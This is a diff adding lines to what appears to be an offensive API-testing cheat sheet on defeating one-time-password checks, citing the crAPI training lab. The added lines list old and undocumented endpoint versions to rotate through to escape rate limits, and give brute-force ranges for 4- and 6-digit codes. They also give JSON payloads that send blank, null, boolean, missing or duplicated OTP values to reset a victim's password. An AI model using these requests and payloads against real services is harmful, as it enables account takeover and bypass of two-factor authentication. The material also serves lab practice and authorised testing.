@@ -26,3 +26,34 @@ results = await asyncio.gather(*[submit(s, "123456") for _ in range(20)])
 window=1
 {"success":false,"reason":"invalid_otp"}
 {"success":true,"token":"<any>"}
+# ─── /api/v3 rate-limits OTP brute → /api/v2 does not (BrokenAuth PDF crAPI lab) ───
+# When /api/v3/check-otp returns 503 after 10 attempts (rate-limited), rotate to
+# older versions — they often share the same handler but lack the rate-limit
+# middleware. Confirmed lab: crAPI (apisec.ai) — brute 4-digit OTP on v2.
+POST /api/v1/check-otp        # try v1
+POST /api/v2/check-otp        # try v2
+POST /api/v3/check-otp        # rate-limited
+POST /api/v4/check-otp        # sometimes undocumented alpha with less middleware
+POST /api/beta/check-otp
+POST /api/internal/check-otp
+POST /api/legacy/check-otp
+POST /internal/api/check-otp
+POST /_api/check-otp
+POST /rest/v1/check-otp
+# ─── same rotation for other OTP endpoints ───
+POST /api/v1/2fa/verify
+POST /api/v1/mfa/verify
+POST /api/v1/otp/verify
+POST /api/v1/auth/verify-otp
+POST /api/v1/verify-code
+POST /api/v1/confirm-code
+POST /api/v1/sms/verify
+# ─── OTP brute-force helpers ───
+# 4-digit: 0000-9999 (10k requests, Intruder Payload set 1, Numbers 0000-9999 sequential)
+# 6-digit: 000000-999999 (1M requests, worth it only if no lockout)
+# ─── OTP bypass parameter tampering ───
+{"email":"victim@x.com","otp":"","password":"newpass"}      # blank OTP
+{"email":"victim@x.com","otp":null,"password":"newpass"}    # null OTP
+{"email":"victim@x.com","otp":true,"password":"newpass"}    # boolean coercion
+{"email":"victim@x.com","password":"newpass"}               # omit OTP entirely
+{"email":"victim@x.com","otp":"1234","otp":"5678","password":"newpass"}  # duplicate key
